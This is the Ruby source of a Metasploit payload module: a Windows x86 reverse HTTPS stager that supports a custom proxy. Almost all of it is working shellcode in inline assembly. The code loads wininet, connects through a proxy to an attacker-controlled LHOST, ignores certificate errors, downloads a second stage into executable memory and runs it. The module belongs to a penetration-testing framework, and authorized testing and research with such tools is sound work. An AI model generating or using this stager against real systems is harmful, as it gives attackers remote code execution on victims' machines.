##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 400

  include Msf::Payload::Stager
  include Msf::Payload::Windows
  include Msf::Payload::Windows::BlockApi

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Reverse HTTPS Stager with Support for Custom Proxy',
        'Description' => 'Tunnel communication over HTTP using SSL with custom proxy support',
        'Author' => ['hdm', 'corelanc0d3r <peter.ve[at]corelan.be>', 'amaloteaux'],
        'License' => MSF_LICENSE,
        'Platform' => 'win',
        'Arch' => ARCH_X86,
        'Handler' => Msf::Handler::ReverseHttpsProxy,
        'Convention' => 'sockedi https',
        'Stager' => { 'Payload' => '' }
      )
    )
  end

  #
  # Do not transmit the stage over the connection.  We handle this via HTTPS
  #
  def stage_over_connection?
    false
  end

  #
  # Generate the first stage
  #
  def generate(_opts = {})
    proxyhost = datastore['HttpProxyHost'].to_s
    proxyhost = "[#{proxyhost}]" if Rex::Socket.is_ipv6?(proxyhost)
    proxyport = datastore['HttpProxyPort'].to_s || '8080'
    proxyinfo = proxyhost

    proxyinfo = "#{proxyhost}:#{proxyport}" unless proxyport == '80'
    protocol = 'socks='
    if datastore['HttpProxyType'].to_s == 'HTTP'
      protocol = 'http://'
    end
    proxyinfo = protocol + proxyinfo

    proxy_auth_asm = ''
    unless datastore['HttpProxyUser'].to_s == '' ||
           datastore['HttpProxyPass'].to_s == '' ||
           datastore['HttpProxyType'].to_s == 'SOCKS'
      proxy_auth_asm = %(
          call set_proxy_username
      proxy_username:
            db "#{datastore['HttpProxyUser']}",0x00
      set_proxy_username:
          pop ecx                ; Save the proxy username
          push dword 15 	       ; DWORD dwBufferLength
          push ecx  	 	         ; LPVOID lpBuffer (username)
          push byte 43           ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
          push esi		           ; hConnection
          push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
          call ebp

          call set_proxy_password
      proxy_password:
            db "#{datastore['HttpProxyPass']}",0x00
      set_proxy_password:
          pop ecx                ; Save the proxy password
          push dword 15		       ; DWORD dwBufferLength
          push ecx  	 	         ; LPVOID lpBuffer (password)
          push byte 44           ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
          push esi		           ; hConnection
          push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
          call ebp
      )
    end

    payload = %(
        cld
        call start
        #{asm_block_api}
    start:
        pop ebp
    load_wininet:
        push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
        push 0x696e6977        ; ...
        push esp               ; Push a pointer to the "wininet" string on the stack.
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp               ; LoadLibraryA( "wininet" )
        call internetopen

    proxy_server_name:
        db "#{proxyinfo}",0x00

    internetopen:
        pop ecx                ; pointer to proxy_server_name
        xor edi,edi
        push edi               ; DWORD dwFlags
        push esp               ; LPCTSTR lpszProxyBypass (empty)
        push ecx               ; LPCTSTR lpszProxyName
        push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY  = 3)
        push 0                 ; NULL pointer
        ;  push esp            ; LPCTSTR lpszAgent ("\x00") // doesn't seem to work with this
        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
        call ebp
        jmp dbl_get_server_host

    internetconnect:
        pop ebx                           ; Save the hostname pointer
        xor ecx, ecx
        push ecx                          ; DWORD_PTR dwContext (NULL)
        push ecx                          ; dwFlags
        push 3                            ; DWORD dwService (INTERNET_SERVICE_HTTP)
        push ecx                          ; password
        push ecx                          ; username
        push #{datastore['LPORT']}        ; PORT
        push ebx                          ; HOSTNAME
        push eax                          ; HINTERNET hInternet
        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
        call ebp

        mov esi,eax		 ; safe hConnection
        #{proxy_auth_asm}
        jmp get_server_uri

    httpopenrequest:
        pop ecx
        xor edx, edx          ; NULL
        push edx              ; dwContext (NULL)
        push (0x80000000 | 0x04000000 | 0x00800000 | 0x00200000 |0x00001000 |0x00002000 |0x00000200) ; dwFlags
            ;0x80000000 |     ; INTERNET_FLAG_RELOAD
            ;0x04000000 |     ; INTERNET_NO_CACHE_WRITE
            ;0x00800000 |     ; INTERNET_FLAG_SECURE
            ;0x00200000 |     ; INTERNET_FLAG_NO_AUTO_REDIRECT
            ;0x00001000 |     ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID
            ;0x00002000 |     ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
            ;0x00000200       ; INTERNET_FLAG_NO_UI
        push edx              ; accept types
        push edx              ; referrer
        push edx              ; version
        push ecx              ; url
        push edx              ; method
        push esi              ; hConnection
        push #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
        call ebp
        mov esi, eax           ; hHttpRequest

    set_retry:
        push 0x10
        pop ebx

    ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
    set_security_options:
        push 0x00003380
                              ;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
                              ;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID
                              ;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE
                              ;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA
                              ;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION
        mov eax, esp
        push 4                ; sizeof(dwFlags)
        push eax              ; &dwFlags
        push 31               ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
        push esi              ; hRequest
        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
        call ebp

    httpsendrequest:
        xor edi, edi
        push edi               ; optional length
        push edi               ; optional
        push edi               ; dwHeadersLength
        push edi               ; headers
        push esi               ; hHttpRequest
        push #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
        call ebp
        test eax,eax
        jnz allocate_memory

    try_it_again:
        dec ebx
        jz failure
        jmp set_security_options

    dbl_get_server_host:
        jmp get_server_host

    get_server_uri:
        call httpopenrequest

    server_uri:
        db "/#{generate_uri_checksum(Msf::Handler::ReverseHttpsProxy::URI_CHECKSUM_INITW)}", 0x00

    failure:
        push #{Rex::Text.block_api_hash('kernel32.dll', 'ExitProcess')}        ; hardcoded to exitprocess for size
        call ebp

    allocate_memory:
        push 0x40              ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; MEM_COMMIT
        push 0x00400000        ; Stage allocation (8Mb ought to do us)
        push edi               ; NULL as we dont care where the allocation is (zero'd from the prev function)
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}        ; hash( "kernel32.dll", "VirtualAlloc" )
        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

    download_prep:
        xchg eax, ebx          ; place the allocated base address in ebx
        push ebx               ; store a copy of the stage base address on the stack
        push ebx               ; temporary storage for bytes read count
        mov edi, esp           ; &bytesRead

    download_more:
        push edi               ; &bytesRead
        push 8192              ; read length
        push ebx               ; buffer
        push esi               ; hRequest
        push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
        call ebp

        test eax,eax           ; download failed? (optional?)
        jz failure

        mov eax, [edi]
        add ebx, eax           ; buffer += bytes_received

        test eax,eax           ; optional?
        jnz download_more      ; continue until it returns 0
        pop eax                ; clear the temporary storage

    execute_stage:
        ret                    ; dive into the stored stage address

    get_server_host:
        call internetconnect
    server_host:
        db "#{datastore['LHOST']}",0x00
    )

    Metasm::Shellcode.assemble(Metasm::X86.new, payload).encode_string
  end

  #
  # Always wait at least 20 seconds for this payload (due to staging delays)
  #
  def wfs_delay
    20
  end
end
